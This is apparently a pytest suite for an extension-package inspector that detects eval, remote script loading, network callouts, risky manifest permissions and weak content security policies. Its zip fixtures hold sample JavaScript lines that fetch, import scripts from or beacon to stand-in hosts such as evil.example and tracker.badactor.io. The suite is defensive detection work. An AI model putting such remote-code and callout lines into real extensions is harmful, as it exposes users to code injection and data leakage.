import io
import json
import zipfile
from hashlib import sha256

import pytest

from app.inspector import InspectorError, inspect_package


def make_zip(files: dict[str, str | bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            if isinstance(content, str):
                content = content.encode()
            zf.writestr(name, content)
    return buf.getvalue()


def test_basic_manifest_permissions():
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 3,
                    "name": "Test",
                    "version": "1.0",
                    "permissions": ["storage", "tabs"],
                    "host_permissions": ["<all_urls>"],
                }
            ),
            "background.js": "console.log('ok');",
        }
    )
    result = inspect_package(data)
    assert "storage" in result.permissions
    assert "tabs" in result.permissions
    assert "<all_urls>" in result.host_permissions
    assert result.manifest_version == 3


def test_eval_detection():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "content.js": "eval('alert(1)'); doSomething();",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True


def test_new_function_detection():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "var f = new Function('return 1');",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is True


def test_remote_code_detection():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "fetch('https://evil.example.com/data').then(r => r.json());",
        }
    )
    result = inspect_package(data)
    assert result.uses_remote_code is True
    assert result.network_callout_urls == ["https://evil.example.com/data"]


def test_external_domain_extracted():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "var url = 'https://tracker.badactor.io/collect';",
        }
    )
    result = inspect_package(data)
    assert any("badactor.io" in d for d in result.external_domains)
    assert "https://tracker.badactor.io/collect" in result.external_urls


def test_package_sha256_is_recorded():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "bg.js": "console.log('ok');",
        }
    )
    result = inspect_package(data)
    assert result.package_sha256 == sha256(data).hexdigest()
    assert result.archive_sha256 == sha256(data).hexdigest()


def test_safe_domains_not_flagged():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "fetch('https://fonts.googleapis.com/css?family=Roboto');",
        }
    )
    result = inspect_package(data)
    assert result.external_domains == []
    assert result.external_urls == []
    assert result.network_callout_urls == []


def test_no_eval_clean_code():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "function greet(name) { return 'Hello ' + name; }",
        }
    )
    result = inspect_package(data)
    assert result.uses_eval is False
    assert result.uses_remote_code is False


def test_file_count():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
            "bg.js": "",
            "content.js": "",
            "popup.html": "",
        }
    )
    result = inspect_package(data)
    assert result.file_count == 4


def test_invalid_zip_raises():
    with pytest.raises(InspectorError):
        inspect_package(b"not a zip file at all")


def test_crx_header_stripped():
    """Simulate a CRX with a fake header before the zip magic."""
    zip_bytes = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "T", "version": "1"}),
        }
    )
    # Prepend fake CRX3 header bytes
    fake_header = b"Cr24" + b"\x00" * 12
    crx_data = fake_header + zip_bytes
    result = inspect_package(crx_data)
    assert result.manifest_version == 3
    assert result.package_sha256 == sha256(crx_data).hexdigest()
    assert result.archive_sha256 == sha256(zip_bytes).hexdigest()


def test_vscode_package_json():
    data = make_zip(
        {
            "extension/package.json": json.dumps(
                {
                    "name": "my-ext",
                    "version": "0.5.0",
                    "contributes": {"commands": []},
                }
            ),
            "extension/background.js": "console.log('vscode');",
        }
    )
    result = inspect_package(data)
    # VS Code extensions don't have Chrome-style permissions
    assert result.permissions == []
    assert "manifest_v2" not in _finding_codes(result)


def _finding_codes(result):
    return {f.code for f in result.findings}


def test_finding_shape_includes_context():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "nested/background.js": "\n\nconst result = eval('2 + 2');",
        }
    )
    result = inspect_package(data)
    finding = next(f for f in result.findings if f.code == "eval_usage")
    assert finding.severity == "high"
    assert finding.source == "javascript"
    assert finding.file == "nested/background.js"
    assert finding.line == 3
    assert finding.title
    assert finding.detail


@pytest.mark.parametrize(
    ("source", "expected_code"),
    [
        ("eval('alert(1)')", "eval_usage"),
        ("const f = new Function('return 1');", "new_function_usage"),
        ("setTimeout('alert(1)', 10);", "string_timer_execution"),
        (
            "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';",
            "dynamic_script_injection",
        ),
        ("importScripts('https://evil.example/sw.js');", "remote_import_scripts"),
        ("fetch('https://evil.example/data');", "remote_fetch"),
        ("const x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/data');", "remote_xhr"),
        ("const ws = new WebSocket('wss://evil.example/socket');", "remote_websocket"),
        ("const events = new EventSource('https://evil.example/events');", "remote_eventsource"),
        ("navigator.sendBeacon('https://evil.example/beacon', '{}');", "remote_send_beacon"),
    ],
)
def test_javascript_detector_findings(source, expected_code):
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": source,
        }
    )
    result = inspect_package(data)
    assert expected_code in _finding_codes(result)


def test_manifest_risk_findings():
    data = make_zip(
        {
            "manifest.json": json.dumps(
                {
                    "manifest_version": 2,
                    "name": "x",
                    "version": "1",
                    "permissions": ["debugger", "tabs"],
                    "host_permissions": ["<all_urls>"],
                    "content_security_policy": "script-src 'self' 'unsafe-eval' http://bad.example *; object-src 'self'",
                }
            ),
        }
    )
    result = inspect_package(data)
    codes = _finding_codes(result)
    assert "manifest_v2" in codes
    assert "broad_host_access" in codes
    assert "high_risk_permission" in codes
    assert "csp_unsafe_eval" in codes
    assert "csp_insecure_remote_source" in codes
    assert "csp_wildcard_script_source" in codes


def test_minified_and_obfuscated_findings():
    compressed = " ".join(["a"] * 600)
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "packed.js": compressed,
        }
    )
    result = inspect_package(data)
    codes = _finding_codes(result)
    assert "minified_javascript" in codes
    assert "obfuscated_javascript" in codes


def test_oversized_manifest_is_skipped():
    data = make_zip(
        {
            "manifest.json": b"{" + (b" " * (1024 * 1024 + 1)) + b"}",
            "background.js": "eval('alert(1)');",
        }
    )
    result = inspect_package(data)
    assert result.permissions == []
    assert "eval_usage" in _finding_codes(result)


def test_findings_are_capped():
    files = {
        "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
    }
    for idx in range(250):
        files[f"file{idx}.js"] = "eval('alert(1)');"
    result = inspect_package(make_zip(files))
    assert len(result.findings) == 200


def test_external_domains_are_capped():
    urls = "\n".join(f"https://tracker{i}.example/path" for i in range(600))
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": urls,
        }
    )
    result = inspect_package(data)
    assert len(result.external_domains) == 500


def test_external_urls_are_capped_and_deduped():
    urls = "\n".join(f"https://tracker{i}.example/path" for i in range(600))
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": urls + "\nhttps://tracker1.example/path",
        }
    )
    result = inspect_package(data)
    assert len(result.external_urls) == 500
    assert result.external_urls.count("https://tracker1.example/path") == 1


def test_external_urls_ignore_non_domain_hosts_and_strip_trailing_punctuation():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": "const local = 'https://interceptor'; const remote = 'https://evil.example/path)';",
        }
    )
    result = inspect_package(data)
    assert "interceptor" not in result.external_domains
    assert "https://interceptor" not in result.external_urls
    assert "evil.example" in result.external_domains
    assert "https://evil.example/path" in result.external_urls


def test_network_callout_urls_are_split_from_literal_references():
    data = make_zip(
        {
            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
            "background.js": "\n".join(
                [
                    "const docs = 'http://www.w3.org/1998/Math/MathML';",
                    "fetch('https://api.example/data');",
                    "const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://xhr.example/collect');",
                    "const ws = new WebSocket('wss://socket.example/ws');",
                    "navigator.sendBeacon('https://beacon.example/ping', '{}');",
                ]
            ),
        }
    )
    result = inspect_package(data)
    assert "http://www.w3.org/1998/Math/MathML" in result.external_urls
    assert "https://api.example/data" in result.network_callout_urls
    assert "https://xhr.example/collect" in result.network_callout_urls
    assert "wss://socket.example/ws" in result.network_callout_urls
    assert "https://beacon.example/ping" in result.network_callout_urls
    assert "http://www.w3.org/1998/Math/MathML" not in result.network_callout_urls
